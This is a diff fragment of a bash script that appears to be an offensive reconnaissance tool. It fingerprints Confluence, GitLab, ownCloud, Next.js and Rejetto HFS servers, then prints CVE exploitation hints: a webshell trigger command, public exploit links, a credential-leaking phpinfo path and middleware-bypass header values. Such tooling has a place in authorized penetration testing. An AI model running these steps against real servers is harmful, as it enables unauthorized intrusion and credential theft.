                 echo "  curl -sk ${url%/}/phpmyadmin/   # login page"
@@ -2241,9 +2395,9 @@ generate_summary() {
                 echo "  # Trigger: curl '${url%/}/shell.php?cmd=id'"
             fi
 
-            # Atlassian Confluence — CVE-2023-22527 unauth OGNL RCE (Jan 2024, 8.0.0-8.5.3)
-            if grep -qi 'Confluence' "$cms_whatweb" 2>/dev/null || \
-               grep -qi 'login.action\|dashboard.action' "$cms_paths" 2>/dev/null; then
+            # Atlassian Confluence — confirm via login.action body
+            if _confirm_fingerprint "$url" "/login.action" 'Confluence|atl-login|os_username' \
+                || _confirm_fingerprint "$url" "/" 'X-Confluence-Request-Time:|Confluence [0-9]'; then
                 cms_any=true
                 echo "  Atlassian Confluence detected:"
                 echo "  curl -sk ${url%/}/login.action | grep -oE 'Confluence [0-9.]+' | head -1"
@@ -2254,9 +2408,10 @@ generate_summary() {
                 echo "  # Earlier CVE-2019-3396 path traversal → https://github.com/Yt1g3r/CVE-2019-3396_EXP"
             fi
 
-            # GitLab — CVE-2023-7028 unauth account takeover (Jan 2024, 16.1.0-16.7.1)
-            if grep -qi 'GitLab' "$cms_whatweb" 2>/dev/null || \
-               grep -qi '/users/sign_in\|/-/graphql' "$cms_paths" 2>/dev/null; then
+            # GitLab — confirm via GitLab-specific login markup or meta tag
+            if _confirm_fingerprint "$url" "/users/sign_in" 'GitLab|gitlab-logo|user\[login\]' \
+                || _confirm_fingerprint "$url" "/" '<meta content="GitLab|X-Gitlab-|gl-ui' \
+                || _confirm_fingerprint "$url" "/help" 'GitLab (Community|Enterprise) Edition'; then
                 cms_any=true
                 echo "  GitLab detected:"
                 echo "  curl -sk ${url%/}/help | grep -oE 'GitLab (Community|Enterprise) Edition [0-9.]+' | head -1"
@@ -2269,8 +2424,9 @@ generate_summary() {
                 echo "  # Older: CVE-2021-22205 ExifTool RCE (unauth) — https://github.com/Al1ex/CVE-2021-22205"
             fi
 
-            # ownCloud — CVE-2023-49103 credential/env disclosure (Nov 2023, 10.6.0-10.13.0)
-            if grep -qi 'ownCloud\|owncloud' "$cms_whatweb" 2>/dev/null; then
+            # ownCloud — confirm via ownCloud-specific markup or status endpoint
+            if _confirm_fingerprint "$url" "/status.php" '"installed":|"productname":"ownCloud"|"versionstring"' \
+                || _confirm_fingerprint "$url" "/" 'ownCloud|oc-dialog|data-requesttoken'; then
                 cms_any=true
                 echo "  ownCloud detected:"
                 echo "  # CVE-2023-49103 phpinfo leaks env vars incl. DB/admin creds (graphapi 0.2.x-0.3.0):"
@@ -2279,9 +2435,8 @@ generate_summary() {
                 echo "  # Alt path (some installs): ${url%/}/index.php/apps/graphapi/vendor/.../GetPhpInfo.php"
             fi
 
-            # Next.js — CVE-2025-29927 middleware auth bypass (Mar 2025, <14.2.25 / <15.2.3)
-            if grep -qiE 'Next[.]?js|X-Powered-By:\s*Next' "$cms_whatweb" 2>/dev/null || \
-               grep -qiE '_next/static|/__next' "$cms_paths" 2>/dev/null; then
+            # Next.js — confirm via X-Powered-By header or _next asset references
+            if _confirm_fingerprint "$url" "/" 'X-Powered-By:\s*Next\.js|/_next/static/|__NEXT_DATA__|__next'; then
                 cms_any=true
                 echo "  Next.js detected:"
                 echo "  # CVE-2025-29927 middleware bypass — magic header skips middleware auth/validation:"
@@ -2293,8 +2448,8 @@ generate_summary() {
                 echo "  # Also try subrequest chain: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
             fi
 
-            # Rejetto HFS 2.x — CVE-2024-23692 unauth template RCE (Jun 2024, 2.3m-2.4)
-            if grep -qiE 'HttpFileServer|HFS\s*2\.|Rejetto' "$cms_whatweb" 2>/dev/null; then
+            # Rejetto HFS 2.x — confirm via HFS-specific server header or UI markup
+            if _confirm_fingerprint "$url" "/" 'Server:\s*HFS|HttpFileServer|HFS ~ http file server|Rejetto'; then
                 cms_any=true
                 echo "  Rejetto HFS 2.x detected:"
                 echo "  # CVE-2024-23692 unauth template RCE via search param:"
